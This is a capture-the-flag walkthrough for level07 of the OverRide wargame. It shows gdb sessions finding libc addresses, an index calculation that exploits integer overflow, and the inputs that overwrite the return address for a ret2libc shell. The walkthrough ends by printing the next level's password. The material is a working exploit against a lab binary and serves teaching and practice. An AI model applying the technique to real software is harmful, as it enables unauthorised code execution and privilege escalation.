To calculate the offset `0x1d0 - 0x24 + 0x8 + 0x4(ebx) + 0x4(esi) + 0x4(edi) + 0x4(ebp)`

```
level07@OverRide:~$ gdb -q level07
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x8048729
(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

0xf7e6aed0 => 4159090384 => system
0xf7e5eb70 => 4159040368 => exit
0xf7f897ec => 4160264172 => "/bin/sh"
```

```
4294967295 (0xffffffff) / 4 + 1 + 114 = 1073741938
```

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/$(whoami)/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
